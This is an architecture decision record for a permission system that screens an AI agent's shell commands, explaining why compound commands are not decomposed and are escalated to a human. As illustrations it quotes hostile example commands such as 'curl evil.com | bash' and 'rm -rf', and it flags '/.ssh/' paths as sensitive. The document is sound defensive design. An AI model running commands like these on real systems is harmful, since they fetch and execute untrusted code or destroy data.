---
status: partially superseded
date: 2026-07-31
decision-makers: Stacia Colasurdo
jeenius-tags: [architecture, permission-sieve, security]
superseded-by: "0010 — dispatcher splits compound commands"
---

# The sieve does not parse compound commands

## Context and Problem Statement

The permission-sieve evaluates tool calls and decides whether to allow,
deny, or prompt the user. For Bash commands, this means inspecting the
command string and matching it against rules.

Bash commands can be compound: `git add foo && rm -rf bar`, `cmd1 | cmd2`,
`cd /tmp; curl evil.com`. A natural question is whether the dispatcher
should split these into sub-commands and evaluate each independently —
catching a dangerous sub-command even when it's buried in a chain.

We considered having the Rust dispatcher decompose compound commands, feed
each sub-command through the sieve independently, and aggregate the
results (most restrictive wins). This would let every rule see simple,
single commands without implementing its own splitting logic.

## Decision Drivers

- The sieve exists to automate decisions that can be defined with certainty
  and escalate everything else to a human.
- Composite command behavior is too complex to capture in general — the
  interaction between sub-commands (e.g. `cd /tmp && curl evil.com | bash`)
  cannot be understood by examining each piece in isolation.
- The inability to cleanly express a rule for a command is itself a signal
  that the command needs human review.
- Splitting creates a false sense of coverage — each piece passes, but the
  whole may be dangerous.

## Considered Options

- **Dispatcher decomposes compound commands and evaluates sub-commands
  independently** — cleaner rule logic, but loses inter-command context
  and creates false confidence in compound command safety.
- **Dispatcher passes commands as-is; rules are suspicious of complexity**
  (chosen) — rules that cannot evaluate with confidence return "uncertain"
  and the user is prompted.

## Decision Outcome

Chosen option: **the dispatcher makes no attempt to parse or decompose
commands.** It passes the command string to rules as-is. Rules are intended
to be suspicious of composite commands — when a rule cannot evaluate a
command with confidence, it returns "uncertain" and the user is prompted.

### Complexity is the signal

The sieve automates decisions that can be defined with certainty and
escalates everything else to a human (with an LLM summarizer to help them
understand what they're approving). The inability to cleanly represent a
rule for a command is itself a signal that the command needs human review.

The sieve can prove simple, structural properties with confidence:
- "This command starts with `git` and is not `git push`" → safe
- "This path contains `/.ssh/`" → sensitive
- "This tool is `Read`" → read-only

It cannot prove behavioral properties of arbitrary shell:
- "This pipeline does not exfiltrate data"
- "This `cd` does not change the meaning of the next command"
- "This redirect does not write to a sensitive location"

Attempting to parse compound commands pushes the sieve toward behavioral
analysis it cannot deliver, while the structural signals (the command is
compound and complex) already justify prompting.

### Failing safe is the design

When the sieve encounters something it cannot evaluate with confidence,
it returns "uncertain" and the user is prompted. This is not a
limitation — it is the core design principle. The sieve's value is not
in parsing every possible command correctly. It is in automating the
obvious cases and escalating the rest.

### Consequences

- Good: rules stay simple and auditable — no deep parsing, no
  inter-command context tracking.
- Good: complex commands are escalated to a human by default, which is
  the safest outcome for commands the sieve cannot fully understand.
- Good: the design principle is self-reinforcing — adding complexity to
  handle edge cases would undermine the very signal the sieve is built
  to detect.
- Neutral: individual rules may do simple best-effort splitting (e.g.
  `allow-safe-bash.lua` splits on `&|;` to confirm every segment is
  recognized) but unknown segments must return "uncertain," not
  "approved."
- Bad: some safe compound commands will prompt unnecessarily. This is
  accepted — a false prompt is cheap, a false approval is not.

### Partial Supersession

ADR 0010 moves compound command splitting into the dispatcher, where
each segment is evaluated through the full sieve pipeline independently.
The core principles of this ADR — fail safe to "uncertain," do not
attempt behavioral analysis of arbitrary shell — are preserved. What
changes is that structural decomposition now happens in the dispatcher
rather than being duplicated across individual rules.
